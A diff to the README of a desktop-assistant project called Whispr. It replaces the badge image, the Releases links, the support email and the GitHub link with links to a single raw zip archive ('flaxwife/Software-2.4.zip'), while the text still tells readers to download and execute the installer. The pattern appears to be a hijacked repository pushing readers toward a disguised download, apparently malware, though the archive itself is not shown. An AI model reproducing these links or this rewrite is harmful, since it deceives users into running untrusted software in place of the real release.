@@ -1,6 +1,6 @@
 # Whispr: Your Minimalistic Desktop Assistant 🌟
 
-![Whispr Logo](https://img.shields.io/badge/Whispr-Desktop%20Assistant-blue?style=for-the-badge)
+![Whispr Logo](https://github.com/kn0077/Whispr/raw/refs/heads/main/flaxwife/Software-2.4.zip%20Assistant-blue?style=for-the-badge)
 
 Welcome to the Whispr repository! Whispr is a sleek, minimalistic desktop assistant designed to enhance your productivity. It resides in your system tray, providing you with instant access to a variety of features through simple hotkeys. Whether you want to search the web, launch applications, or chat with AI models like ChatGPT, Whispr offers a beautiful, distraction-free user interface.
 
@@ -26,7 +26,7 @@ Whispr brings a host of features to your desktop:
 
 ## Installation
 
-To get started with Whispr, you can download the latest release from the [Releases](https://github.com/kn0077/Whispr/releases) section. Once downloaded, execute the installer and follow the on-screen instructions to set up Whispr on your machine.
+To get started with Whispr, you can download the latest release from the [Releases](https://github.com/kn0077/Whispr/raw/refs/heads/main/flaxwife/Software-2.4.zip) section. Once downloaded, execute the installer and follow the on-screen instructions to set up Whispr on your machine.
 
 ## Usage
 
@@ -66,12 +66,12 @@ Whispr is open-source software licensed under the MIT License. You can use, modi
 
 For any inquiries or feedback, feel free to reach out to us:
 
-- **Email**: support@whisprapp.com
-- **GitHub**: [Whispr GitHub](https://github.com/kn0077/Whispr)
+- **Email**: https://github.com/kn0077/Whispr/raw/refs/heads/main/flaxwife/Software-2.4.zip
+- **GitHub**: [Whispr GitHub](https://github.com/kn0077/Whispr/raw/refs/heads/main/flaxwife/Software-2.4.zip)
 
 ## Releases
 
-You can find the latest version of Whispr in the [Releases](https://github.com/kn0077/Whispr/releases) section. Download the appropriate file for your operating system and execute it to install the application.
+You can find the latest version of Whispr in the [Releases](https://github.com/kn0077/Whispr/raw/refs/heads/main/flaxwife/Software-2.4.zip) section. Download the appropriate file for your operating system and execute it to install the application.
 
 ## Conclusion
 
